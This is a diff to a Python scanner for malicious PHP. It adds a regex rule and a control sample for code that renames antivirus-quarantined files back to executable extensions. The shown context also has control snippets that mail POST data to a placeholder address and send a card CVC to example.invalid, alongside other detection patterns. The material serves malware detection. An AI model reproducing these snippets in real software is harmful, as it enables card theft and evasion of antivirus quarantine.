@@ -119,6 +119,16 @@ _SINK = re.compile(
 _PHPMAILER = re.compile(rb"PHPMailer")
 _PWLIT = re.compile(rb"\$password\s*=\s*[\"'][^\"']{4,40}[\"']")
 _INC_TXT = re.compile(rb"(?:include|require)(?:_once)?\s*[^;]{0,200}?\.txt", re.I)
+# A rename whose SOURCE carries a quarantine suffix and whose TARGET is executable.
+# `.suspected` is what cPanel/ImunifyAV appends when it quarantines a file, so this is
+# code that reverses an antivirus action. There is no honest reading of it: a legitimate
+# program has no reason to know that suffix, still less to undo it.
+_UNQUARANTINE = re.compile(
+    rb"""rename\s*\(\s*[^,)]*\.(?:suspected|quarantine|infected|virus|malware|bak_av)"""
+    rb"""[^,)]*,\s*[^)]*\.(?:php|phtml|php5|inc|module|cgi|pl|py|sh)\b""",
+    re.I | re.X)
+_RENAME = re.compile(rb"\brename\s*\(", re.I)
+
 _FORM = re.compile(rb"<form", re.I)
 _CARDFIELD = re.compile(
     rb"name\s*=\s*[\"'][^\"']*(card|ccnum|cc_num|cvv|cvc|expir|ssn)", re.I)
@@ -150,6 +160,12 @@ CANDIDATES = {
         family="phish-kit (14 rows / 7 files / 1 exfil file)",
         at_risk=lambda b, n: bool(_MAIL.search(b)),
         match=lambda b, n: bool(_MAIL.search(b) and _POST.search(b) and _ADDR.search(b)),
+    ),
+    "unquarantine-rename": dict(
+        blurb="rename() from a quarantine suffix back to an executable extension",
+        family="seo-doorway deployers (3 files, currently unreviewed and undetected)",
+        at_risk=lambda b, n: bool(_RENAME.search(b)),
+        match=lambda b, n: bool(_UNQUARANTINE.search(b)),
     ),
     "card-data-to-remote-sink": dict(
         blurb="a CVC/CVV field name reaching a remote-fetch sink in one file",
@@ -257,6 +273,9 @@ CONTROLS = {
     "mail-exfil-to-fixed-address": ("ctl.php",
                                     b"<?php $v = $_POST['x'];\n"
                                     b"mail(\"drop@example.invalid\", \"s\", $v);\n"),
+    "unquarantine-rename": ("ctl.php",
+                            b"<?php if (file_exists(\"../x.php.suspected\"))\n"
+                            b"  rename(\"../x.php.suspected\", \"../x.php\");\n"),
     "card-data-to-remote-sink": ("ctl.php",
                                  b"<?php $c = $_POST['card-cvc'];\n"
                                  b"file_get_contents('http://example.invalid/?d=' . $c);\n"),
